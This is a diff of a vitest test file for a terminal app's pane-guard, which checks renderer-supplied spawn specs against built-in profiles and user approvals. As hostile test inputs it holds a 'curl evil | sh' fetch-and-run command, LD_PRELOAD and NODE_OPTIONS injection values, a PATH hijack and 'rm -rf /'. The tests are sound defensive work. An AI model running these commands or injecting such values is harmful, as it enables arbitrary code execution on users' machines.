@@ -1,47 +1,26 @@
+import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { join } from 'node:path'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
-import type { Pane, PaneSpec, PersistedState, Profile, Workspace } from '@shared/types'
-import { isBlockedEnvKey, sanitizeEnv, verifyPaneSpec, type GuardSources } from './pane-guard'
+import type { PaneSpec, Profile } from '@shared/types'
+import {
+  approvalDigest,
+  isBlockedEnvKey,
+  loadApprovalStore,
+  sanitizeEnv,
+  verifyPaneSpec,
+  type ApprovalCandidate,
+  type ApprovalStore,
+  type GuardSources
+} from './pane-guard'
 
 /**
- * The gate on `pty:ensure` (issue #18): the renderer's spec is only a claim,
- * and everything spawned has to be re-derived from the persisted state or the
- * profile registry. These tests drive the gate with both sources stubbed, in
- * the shapes the app actually produces — a pane the debounced save has already
- * written, a brand-new pane straight off a profile, and the specs an attacker
- * would send that correspond to neither.
+ * The gate on `pty:ensure` (issue #18). The renderer's spec is only a claim:
+ * it either re-derives from a BUILT-IN profile main detected itself, or it
+ * needs a native-dialog approval a human actually clicked, cached by digest.
+ * Nothing the renderer can write (a saved launcher, the old persisted state)
+ * or click in the DOM ever grants trust here — see the module doc comment.
  */
-
-const pane = (over: Partial<Pane> = {}): Pane =>
-  ({
-    id: 'pane_1',
-    profileId: 'agent:claude',
-    command: '/usr/local/bin/claude',
-    args: [],
-    cwd: '/home/user/project',
-    status: 'idle',
-    epoch: 0,
-    ...over
-  }) as Pane
-
-const state = (...panes: Pane[]): PersistedState =>
-  ({
-    version: 1,
-    activeWorkspaceId: 'ws_1',
-    workspaces: [{ id: 'ws_1', name: 'project', panes } as Workspace]
-  }) as PersistedState
-
-const profile = (over: Partial<Profile> = {}): Profile =>
-  ({
-    id: 'agent:claude',
-    name: 'Claude Code',
-    command: '/usr/local/bin/claude',
-    args: [],
-    kind: 'agent',
-    icon: 'CC',
-    accent: '#d97757',
-    available: true,
-    ...over
-  }) as Profile
 
 const spec = (over: Partial<PaneSpec> = {}): PaneSpec => ({
   id: 'pane_1',
@@ -51,224 +30,376 @@ const spec = (over: Partial<PaneSpec> = {}): PaneSpec => ({
   ...over
 })
 
-/** Sources with no retry delay — the race being retried for is not under test. */
+const profile = (over: Partial<Profile> = {}): Profile => ({
+  id: 'agent:claude',
+  name: 'Claude Code',
+  command: '/usr/local/bin/claude',
+  args: [],
+  kind: 'agent',
+  icon: 'CC',
+  accent: '#d97757',
+  available: true,
+  ...over
+})
+
+/** An approval store that never remembers anything, so `approve` always runs. */
+const freshApprovals = (): ApprovalStore => ({ has: () => false, remember: vi.fn() })
+
+/** Sources with a profile list that matches nothing, and approval refused by
+ *  default — a test opts in to trust by supplying `profiles` or `approve`. */
 const sources = (over: Partial<GuardSources> = {}): GuardSources => ({
-  state: () => null,
   profiles: () => [],
-  retryMs: 0,
+  approve: async () => false,
+  approvals: freshApprovals(),
   ...over
 })
 
 beforeEach(() => {
   // sanitizeEnv announces every key it drops; asserted where relevant, silent otherwise.
   vi.spyOn(console, 'warn').mockImplementation(() => {})
+  vi.spyOn(console, 'error').mockImplementation(() => {})
 })
 
 afterEach(() => {
   vi.restoreAllMocks()
 })
 
-describe('verifyPaneSpec, against the persisted state', () => {
-  it('accepts a spec that matches its saved pane, field for field', async () => {
-    const verdict = await verifyPaneSpec(spec(), sources({ state: () => state(pane()) }))
+describe('verifyPaneSpec, against built-in profiles', () => {
+  it('accepts a spec that is exactly a detected agent, without asking', async () => {
+    const approve = vi.fn()
+    const verdict = await verifyPaneSpec(spec(), sources({ profiles: () => [profile()], approve }))
 
     expect(verdict).toEqual({ ok: true, spec: spec() })
-  })
-
-  it('spawns the persisted copy, not the renderer object it was handed', async () => {
-    const raw = spec()
-    const verdict = await verifyPaneSpec(raw, sources({ state: () => state(pane()) }))
-
-    if (!verdict.ok) throw new Error(verdict.reason)
-    expect(verdict.spec).not.toBe(raw)
-    expect(verdict.spec.args).not.toBe(raw.args)
-  })
-
-  it('refuses a spec whose command is not what the saved pane runs', async () => {
-    const verdict = await verifyPaneSpec(
-      spec({ command: '/bin/sh', args: ['-c', 'curl evil | sh'] }),
-      sources({ state: () => state(pane()) })
-    )
-
-    expect(verdict.ok).toBe(false)
-  })
-
-  it('refuses a spec that bolts viaShell onto a pane saved without it', async () => {
-    const verdict = await verifyPaneSpec(
-      spec({ viaShell: true }),
-      sources({ state: () => state(pane()) })
-    )
-
-    expect(verdict.ok).toBe(false)
-  })
-
-  it('refuses a spec that adds env the saved pane does not carry', async () => {
-    const verdict = await verifyPaneSpec(
-      spec({ env: { LD_PRELOAD: '/tmp/evil.so' } }),
-      sources({ state: () => state(pane()) })
-    )
-
-    expect(verdict.ok).toBe(false)
-  })
-
-  it('accepts a saved custom command line, env and all — the free-form feature', async () => {
-    const custom = pane({
-      id: 'pane_2',
-      profileId: 'custom',
-      command: 'npm run dev -- --port 3000',
-      args: [],
-      viaShell: true,
-      env: { ANTHROPIC_MODEL: 'claude-fable-5' }
-    })
-    const asked = spec({
-      id: 'pane_2',
-      command: 'npm run dev -- --port 3000',
-      viaShell: true,
-      env: { ANTHROPIC_MODEL: 'claude-fable-5' }
-    })
-
-    const verdict = await verifyPaneSpec(asked, sources({ state: () => state(custom) }))
-
-    expect(verdict).toEqual({ ok: true, spec: asked })
-  })
-
-  it('strips blocked env keys even when the saved pane itself carries them', async () => {
-    const poisoned = pane({
-      env: { NODE_OPTIONS: '--require /tmp/evil.js', HD_FINE: 'yes' }
-    })
-    const asked = spec({ env: { NODE_OPTIONS: '--require /tmp/evil.js', HD_FINE: 'yes' } })
-
-    const verdict = await verifyPaneSpec(asked, sources({ state: () => state(poisoned) }))
-
-    if (!verdict.ok) throw new Error(verdict.reason)
-    expect(verdict.spec.env).toEqual({ HD_FINE: 'yes' })
-  })
-})
-
-describe('verifyPaneSpec, against the profile registry', () => {
-  it('accepts a brand-new pane whose command line is exactly a known profile', async () => {
-    const verdict = await verifyPaneSpec(
-      spec({ id: 'pane_new', cwd: '/anywhere/the/user/picked' }),
-      sources({ profiles: () => [profile()] })
-    )
-
-    expect(verdict).toEqual({
-      ok: true,
-      spec: spec({ id: 'pane_new', cwd: '/anywhere/the/user/picked' })
-    })
+    expect(approve).not.toHaveBeenCalled()
   })
 
   it('waits for the profile list when detection is asynchronous', async () => {
     const verdict = await verifyPaneSpec(
-      spec({ id: 'pane_new' }),
+      spec(),
       sources({ profiles: () => Promise.resolve([profile()]) })
     )
 
     expect(verdict.ok).toBe(true)
   })
 
-  it('refuses a profile command with args the profile does not have', async () => {
+  it('lets the folder be anything when the profile pins none', async () => {
     const verdict = await verifyPaneSpec(
-      spec({ id: 'pane_new', args: ['--dangerously-skip-permissions'] }),
+      spec({ cwd: '/anywhere/the/user/picked' }),
       sources({ profiles: () => [profile()] })
     )
 
-    expect(verdict.ok).toBe(false)
+    expect(verdict).toEqual({
+      ok: true,
+      spec: spec({ cwd: '/anywhere/the/user/picked' })
+    })
   })
 
-  it('refuses extra env riding on a detected profile, which carries none', async () => {
-    const verdict = await verifyPaneSpec(
-      spec({ id: 'pane_new', env: { PATH: '/tmp/evil-bin' } }),
-      sources({ profiles: () => [profile()] })
+  it('enforces a pinned folder when the profile has one', async () => {
+    const pinned = profile({ id: 'custom:pinned', kind: 'agent', cwd: '/only/here' })
+
+    const asked = await verifyPaneSpec(
+      spec({ cwd: '/only/here' }),
+      sources({ profiles: () => [pinned] })
+    )
+    const elsewhere = await verifyPaneSpec(
+      spec({ cwd: '/somewhere/else' }),
+      sources({ profiles: () => [pinned], approve: async () => false })
     )
 
-    expect(verdict.ok).toBe(false)
+    expect(asked.ok).toBe(true)
+    expect(elsewhere.ok).toBe(false)
   })
 
-  it('accepts a saved launcher — viaShell command line plus its own env', async () => {
+  it('rebuilds the spec from the profile record, not the renderer copy', async () => {
+    const raw = spec()
+    const verdict = await verifyPaneSpec(raw, sources({ profiles: () => [profile()] }))
+
+    if (!verdict.ok) throw new Error(verdict.reason)
+    expect(verdict.spec).not.toBe(raw)
+    expect(verdict.spec.args).not.toBe(raw.args)
+  })
+
+  it('never lets custom:* saved launchers vouch for a spec', async () => {
     const launcher = profile({
       id: 'custom:abc',
       kind: 'custom',
       command: 'make watch',
       args: [],
-      viaShell: true,
-      env: { HD_MODE: 'dev' }
+      viaShell: true
     })
+    const approve = vi.fn().mockResolvedValue(true)
 
     const verdict = await verifyPaneSpec(
-      spec({ id: 'pane_new', command: 'make watch', viaShell: true, env: { HD_MODE: 'dev' } }),
-      sources({ profiles: () => [launcher] })
+      spec({ command: 'make watch', viaShell: true }),
+      sources({ profiles: () => [launcher], approve })
     )
 
-    if (!verdict.ok) throw new Error(verdict.reason)
-    expect(verdict.spec.command).toBe('make watch')
-    expect(verdict.spec.viaShell).toBe(true)
-    expect(verdict.spec.env).toEqual({ HD_MODE: 'dev' })
+    expect(approve).toHaveBeenCalledTimes(1)
+    expect(verdict.ok).toBe(true) // only because `approve` said yes
   })
 
-  it('never matches the empty-command "Custom command…" placeholder', async () => {
-    const placeholder = profile({ id: 'custom', kind: 'custom', command: '', args: [] })
+  it('never lets the "Custom command…" sentinel vouch for a spec', async () => {
+    const sentinel = profile({ id: 'custom', kind: 'custom', command: '', args: [] })
+    const approve = vi.fn().mockResolvedValue(false)
 
     const verdict = await verifyPaneSpec(
       spec({ id: 'pane_new', command: '' }),
-      sources({ profiles: () => [placeholder] })
+      sources({ profiles: () => [sentinel], approve })
     )
 
+    expect(approve).toHaveBeenCalledTimes(1)
+    expect(verdict.ok).toBe(false)
+  })
+
+  it('refuses a command with args the profile does not have, sending it to approval', async () => {
+    const approve = vi.fn().mockResolvedValue(false)
+    const verdict = await verifyPaneSpec(
+      spec({ args: ['--dangerously-skip-permissions'] }),
+      sources({ profiles: () => [profile()], approve })
+    )
+
+    expect(approve).toHaveBeenCalledTimes(1)
+    expect(verdict.ok).toBe(false)
+  })
+
+  it('accepts env that is a subset of the profile\'s', async () => {
+    const withEnv = profile({ env: { HD_MODE: 'dev', OTHER: 'x' } })
+    const verdict = await verifyPaneSpec(
+      spec({ env: { HD_MODE: 'dev' } }),
+      sources({ profiles: () => [withEnv] })
+    )
+
+    if (!verdict.ok) throw new Error(verdict.reason)
+    expect(verdict.spec.env).toEqual({ HD_MODE: 'dev', OTHER: 'x' })
+  })
+
+  it('sends env the profile does not offer to approval, not straight through', async () => {
+    const approve = vi.fn().mockResolvedValue(false)
+    const verdict = await verifyPaneSpec(
+      spec({ env: { PATH: '/tmp/evil-bin' } }),
+      sources({ profiles: () => [profile()], approve })
+    )
+
+    expect(approve).toHaveBeenCalledTimes(1)
+    expect(verdict.ok).toBe(false)
+  })
+
+  it('sends a spec carrying `setup` to approval even if the rest matches a profile', async () => {
+    const approve = vi.fn().mockResolvedValue(false)
+    const verdict = await verifyPaneSpec(
+      spec({ setup: 'export LD_PRELOAD=/tmp/evil.so' }),
+      sources({ profiles: () => [profile()], approve })
+    )
+
+    expect(approve).toHaveBeenCalledTimes(1)
     expect(verdict.ok).toBe(false)
   })
 })
 
-describe('verifyPaneSpec, at the edges', () => {
-  it('refuses a spec that corresponds to nothing anywhere', async () => {
+describe('verifyPaneSpec, against the approval dialog', () => {
+  it('asks, and accepts once the callback approves', async () => {
+    const approve = vi.fn().mockResolvedValue(true)
     const verdict = await verifyPaneSpec(
-      spec({ id: 'pane_ghost', command: '/bin/sh', args: ['-c', 'id'] }),
-      sources({ state: () => state(pane()), profiles: () => [profile()] })
+      spec({ command: '/bin/sh', args: ['-c', 'npm run dev'], viaShell: true }),
+      sources({ approve })
+    )
+
+    expect(approve).toHaveBeenCalledTimes(1)
+    expect(approve).toHaveBeenCalledWith(
+      expect.objectContaining({ command: '/bin/sh', args: ['-c', 'npm run dev'], viaShell: true })
+    )
+    expect(verdict.ok).toBe(true)
+  })
+
+  it('refuses in-band, not by throwing, when the dialog is declined', async () => {
+    const verdict = await verifyPaneSpec(
+      spec({ command: '/bin/sh', args: ['-c', 'curl evil | sh'] }),
+      sources({ approve: async () => false })
     )
 
     expect(verdict).toEqual({
       ok: false,
-      reason: expect.stringContaining('pane_ghost') as string
+      reason: expect.stringContaining('pane_1') as string
     })
   })
 
+  it('caches an approval by digest, so the same spec never asks twice', async () => {
+    const approve = vi.fn().mockResolvedValue(true)
+    const store = new Map<string, true>()
+    const approvals: ApprovalStore = {
+      has: (d) => store.has(d),
+      remember: (d) => void store.set(d, true)
+    }
+    const custom = spec({ command: 'npm run dev', viaShell: true })
+
+    const first = await verifyPaneSpec(custom, sources({ approve, approvals }))
+    const second = await verifyPaneSpec(custom, sources({ approve, approvals }))
+
+    expect(first.ok).toBe(true)
+    expect(second.ok).toBe(true)
+    expect(approve).toHaveBeenCalledTimes(1)
+  })
+
+  it('re-prompts when a field the digest covers changes — an added env var', async () => {
+    const approve = vi.fn().mockResolvedValue(true)
+    const store = new Map<string, true>()
+    const approvals: ApprovalStore = {
+      has: (d) => store.has(d),
+      remember: (d) => void store.set(d, true)
+    }
+    const base = spec({ command: 'npm run dev', viaShell: true })
+    const changed = spec({
+      command: 'npm run dev',
+      viaShell: true,
+      env: { PORT: '4000' }
+    })
+
+    await verifyPaneSpec(base, sources({ approve, approvals }))
+    await verifyPaneSpec(changed, sources({ approve, approvals }))
+
+    expect(approve).toHaveBeenCalledTimes(2)
+  })
+
+  it('re-prompts when `setup` changes', async () => {
+    const approve = vi.fn().mockResolvedValue(true)
+    const store = new Map<string, true>()
+    const approvals: ApprovalStore = {
+      has: (d) => store.has(d),
+      remember: (d) => void store.set(d, true)
+    }
+    const base = spec({ command: 'npm run dev', viaShell: true, setup: 'npm install' })
+    const changed = spec({ command: 'npm run dev', viaShell: true, setup: 'pnpm install' })
+
+    await verifyPaneSpec(base, sources({ approve, approvals }))
+    await verifyPaneSpec(changed, sources({ approve, approvals }))
+
+    expect(approve).toHaveBeenCalledTimes(2)
+  })
+
+  it('does not remember a declined approval', async () => {
+    const remember = vi.fn()
+    const approvals: ApprovalStore = { has: () => false, remember }
+
+    await verifyPaneSpec(spec({ command: 'npm run dev' }), sources({ approve: async () => false, approvals }))
+
+    expect(remember).not.toHaveBeenCalled()
+  })
+
+  it('strips blocked env keys even from an approved custom spec', async () => {
+    const verdict = await verifyPaneSpec(
+      spec({
+        command: 'npm run dev',
+        env: { NODE_OPTIONS: '--require /tmp/evil.js', HD_FINE: 'yes' }
+      }),
+      sources({ approve: async () => true })
+    )
+
+    if (!verdict.ok) throw new Error(verdict.reason)
+    expect(verdict.spec.env).toEqual({ HD_FINE: 'yes' })
+  })
+})
+
+describe('verifyPaneSpec, at the edges', () => {
   it.each([
     ['nothing at all', undefined],
     ['null', null],
     ['a string', 'rm -rf /'],
     ['a spec without an id', { command: 'x', args: [], cwd: '/' }],
     ['args that are not strings', { id: 'p', command: 'x', args: [{}], cwd: '/' }],
-    ['env with non-string values', { id: 'p', command: 'x', args: [], cwd: '/', env: { A: 1 } }]
+    ['env with non-string values', { id: 'p', command: 'x', args: [], cwd: '/', env: { A: 1 } }],
+    ['a setup that is not a string', { id: 'p', command: 'x', args: [], cwd: '/', setup: 7 }]
   ])('refuses %s as malformed', async (_name, raw) => {
     const verdict = await verifyPaneSpec(raw, sources())
 
     expect(verdict).toEqual({ ok: false, reason: 'malformed pane spec' })
   })
 
-  it('lets a live session re-attach without consulting either source', async () => {
+  it('lets a live session re-attach without consulting profiles or the dialog', async () => {
     const profiles = vi.fn(() => [])
+    const approve = vi.fn()
     const verdict = await verifyPaneSpec(
       spec({ id: 'pane_live' }),
-      sources({ profiles, attached: (id) => id === 'pane_live' })
+      sources({ profiles, approve, attached: (id) => id === 'pane_live' })
     )
 
     expect(verdict.ok).toBe(true)
     expect(profiles).not.toHaveBeenCalled()
+    expect(approve).not.toHaveBeenCalled()
+  })
+})
+
+describe('approvalDigest', () => {
+  const candidate = (over: Partial<ApprovalCandidate> = {}): ApprovalCandidate => ({
+    command: 'npm',
+    args: ['run', 'dev'],
+    cwd: '/repo',
+    viaShell: true,
+    ...over
   })
 
-  it('re-reads the state once, so a save that lands a beat late still counts', async () => {
-    let asked = 0
-    const verdict = await verifyPaneSpec(
-      spec(),
-      sources({
-        state: () => {
-          asked += 1
-          return asked > 1 ? state(pane()) : null
-        }
-      })
-    )
+  it('is the same regardless of env key order', () => {
+    const a = approvalDigest(candidate({ env: { A: '1', B: '2' } }))
+    const b = approvalDigest(candidate({ env: { B: '2', A: '1' } }))
 
-    expect(verdict.ok).toBe(true)
-    expect(asked).toBe(2)
+    expect(a).toBe(b)
+  })
+
+  it('changes when any field the review flagged changes', () => {
+    const base = approvalDigest(candidate())
+
+    expect(approvalDigest(candidate({ command: 'pnpm' }))).not.toBe(base)
+    expect(approvalDigest(candidate({ args: ['run', 'build'] }))).not.toBe(base)
+    expect(approvalDigest(candidate({ cwd: '/elsewhere' }))).not.toBe(base)
+    expect(approvalDigest(candidate({ viaShell: false }))).not.toBe(base)
+    expect(approvalDigest(candidate({ setup: 'npm install' }))).not.toBe(base)
+    expect(approvalDigest(candidate({ env: { A: '1' } }))).not.toBe(base)
+  })
+})
+
+describe('loadApprovalStore', () => {
+  let dir = ''
+
+  beforeEach(() => {
+    dir = mkdtempSync(join(tmpdir(), 'hd-approvals-'))
+  })
+
+  afterEach(() => {
+    rmSync(dir, { recursive: true, force: true })
+  })
+
+  it('starts empty when no file exists yet', () => {
+    const store = loadApprovalStore(join(dir, 'approved-panes.json'))
+
+    expect(store.has('anything')).toBe(false)
+  })
+
+  it('persists a remembered digest to disk, main-owned — no IPC writes this file', () => {
+    const file = join(dir, 'approved-panes.json')
+    const store = loadApprovalStore(file)
+
+    store.remember('abc123')
+
+    expect(existsSync(file)).toBe(true)
+    expect(JSON.parse(readFileSync(file, 'utf8'))).toEqual(['abc123'])
+  })
+
+  it('reloads what a previous run persisted', () => {
+    const file = join(dir, 'approved-panes.json')
+    loadApprovalStore(file).remember('abc123')
+
+    const reloaded = loadApprovalStore(file)
+
+    expect(reloaded.has('abc123')).toBe(true)
+    expect(reloaded.has('someone-else')).toBe(false)
+  })
+
+  it('ignores an unreadable file instead of throwing', () => {
+    const file = join(dir, 'approved-panes.json')
+    writeFileSync(file, 'not json', 'utf8')
+
+    const store = loadApprovalStore(file)
+
+    expect(store.has('anything')).toBe(false)
   })
 })
 
